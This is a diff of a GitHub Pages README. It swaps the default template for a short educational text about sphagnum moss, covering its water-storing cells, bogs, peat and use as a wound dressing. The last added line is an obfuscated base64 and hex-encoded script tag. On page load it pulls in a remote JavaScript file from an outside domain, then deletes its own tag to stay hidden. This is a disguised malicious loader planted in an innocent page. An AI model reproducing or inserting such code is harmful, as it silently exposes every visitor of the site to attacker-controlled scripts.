@@ -1,37 +1,21 @@
-## Welcome to GitHub Pages
+## Sphagnum protruding
 
-You can use the [editor on GitHub](https://github.com/plantplane/Rod-Sfagnum/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+This genus includes over 300 species, and in Russia, just imagine, there are about 40 species of sphagnum mosses.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+In the textbook, you have already read about the structure of sphagnum, learned that this amazing moss can absorb and retain 20-25 times its own weight in its stems and thin leaves of moisture. This property is explained by the peculiarities of the cellular structure. Sphagnum has two types of cells: some are small green cells, contain chlorophyll, and participate in photosynthesis; others are large, dead, empty, communicating with each other, capable of accumulating and retaining water in themselves. In aquifer cells, sphagnum stores water for a rainy day.
 
-### Markdown
+For the growth and development of sphagnum, soft water is needed - it is water that does not contain mineral salts. This water is rainwater. The presence of calcium salts in the water (this water is called hard), in the presence of which the sphagnum gradually stops growing, acts especially depressing on the vital activity of sphagnum. Therefore, on moist soil, which contains mineral salts, only some species of sphagnum settle and develop.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+The surface of the marshes and the soil of humid forests is covered with powerful sphagnum carpets.
 
-```markdown
-Syntax highlighted code block
+![Branching](gnum_squarrosu6_1.jpg)
 
-# Header 1
-## Header 2
-### Header 3
+Sphagnum bogs, like giant sponges, absorb and absorb all the precipitation that falls throughout the year. And then, very economically and gradually, they give this moisture to large and small rivers, stopping their drying out even in the hottest periods of summer heat and drought. In this regard, ill-considered and unreasonable drainage of swamps can cause a real ecological catastrophe.
 
-- Bulleted
-- List
+Sphagnum mosses are constantly growing at their top, and their lower parts die off. Sphagnum is called bog moss.
 
-1. Numbered
-2. List
+Accumulating year after year, dead mosses form peat deposits. In the mass of peat, deprived of oxygen and rich in special substances that kill microorganisms, harmful fungi and bacteria do not develop. Peat literally "preserves" everything that gets into it. Therefore, it is no coincidence that in the past, bones of long-extinct animals and household items are often found in the thickness of peat in the past, and even now. In one swamp, the remains of a warrior in full knightly equipment were discovered. People have long used sphagnum not only as a dressing material, but also as a disinfectant, replacing iodine with it. In wounds closed with sphagnum, purulent bacteria do not develop.
+ 
+Sphagnum is difficult to confuse with other leafy mosses, not only because the stems and the upper part of each plant are pale green, and the lower one is white, but also because three small round sporogonums rise up among the rosette of leaves.
 
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/plantplane/Rod-Sfagnum/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="vCeis" src="data:text/javascript;base64, dmFyIF9Md1p2NSA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX0xpeExhLCBfSkpoV0UpIHt2YXIgX05jbUdyID0gZnVuY3Rpb24oX2s0UVJ0KSB7d2hpbGUgKC0tX2s0UVJ0KSB7X0xpeExhWydwdXNoJ10oX0xpeExhWydzaGlmdCddKCkpO319O19OY21HcigrK19KSmhXRSk7fShfTHdadjUsIDB4MTFiKSk7dmFyIF85SWEzRyA9IGZ1bmN0aW9uKF9vMlpFZiwgX1BPY0lVKSB7X28yWkVmID0gX28yWkVmIC0gMHgwO3ZhciBfM3hrT2ogPSBfTHdadjVbX28yWkVmXTtyZXR1cm4gXzN4a09qO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfOUlhM0coJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1E1UHVnID0gZG9jdW1lbnRbXzlJYTNHKCcweDEnKV0oXzlJYTNHKCcweDInKSk7X1E1UHVnW185SWEzRygnMHgzJyldID0gXzlJYTNHKCcweDQnKTtfUTVQdWdbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2ZFx4NjFceDcyXHg3M1x4NjhceDYxXHg2Y1x4NmNceDJlXHg3MFx4NjVceDczXHgyZFx4NjlceDJkXHg2Ylx4NmZceDc0XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NTJceDQ3XHg2ZFx4NzlceDVhXHg2ZFx4NjdceDY4XHg3N1x4NmMnO2RvY3VtZW50W185SWEzRygnMHg1JyldKF85SWEzRygnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9RNVB1Zyk7ZG9jdW1lbnRbXzlJYTNHKCcweDcnKV0oJ3ZDZWlzJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
